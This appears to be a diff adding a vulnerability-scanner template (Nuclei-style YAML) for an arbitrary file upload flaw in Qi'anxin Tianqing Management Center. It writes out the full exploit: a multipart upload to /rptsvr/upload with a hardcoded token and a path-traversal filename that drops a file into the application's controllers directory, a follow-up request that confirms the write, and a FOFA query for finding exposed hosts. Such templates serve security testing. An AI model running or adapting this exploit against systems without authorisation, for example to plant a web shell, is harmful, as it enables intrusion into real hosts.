@@ -1,0 +1,52 @@
+id: qax_tianqing_rptsvr_upload
+
+info:
+  name: qax_tianqing_rptsvr_upload
+  author: recjl
+  severity: critical
+  description: There is an arbitrary file upload vulnerability in the rptsvr interface of Qi'anxin Tianqing Management Center.
+  metadata:
+    max-request: 1
+    fofa-query: icon_hash="-829652342"
+    verified: true
+  tags: upload,qax,safety,hw,intrusive
+
+variables:
+  payload: '{{rand_base(6)}}'
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /rptsvr/upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (MacintoshT2lkQm95Rw==; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+        Connection: close
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: en-US,en;q=0.5
+        Content-Type: multipart/form-data;boundary=---------------------------55433477442814818502792421460
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 401
+
+        -----------------------------55433477442814818502792421460
+        Content-Disposition: form-data; name="uploadfile"; filename="../../../application/api/controllers/{{filename}}.txt"
+        Content-Type: text/x-python
+
+        {{payload}}
+        -----------------------------55433477442814818502792421460
+        Content-Disposition: form-data; name="token"
+
+        skylar_report
+        -----------------------------55433477442814818502792421460
+      - |
+        GET /application/api/controllers/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2, '{{payload}}')
+# digest: 4a0a0047304502203e9f2ae05d4c21733f27298e6a87c445f7d32df817ec66ad1802d65ad3084f9d02210095cf35203c9b5d40117d1ee088f7ae0d3b92fe28e0689fca0a4b8c2068637e52:6b2dd5af372f02ed15a56faf8ad98cf9
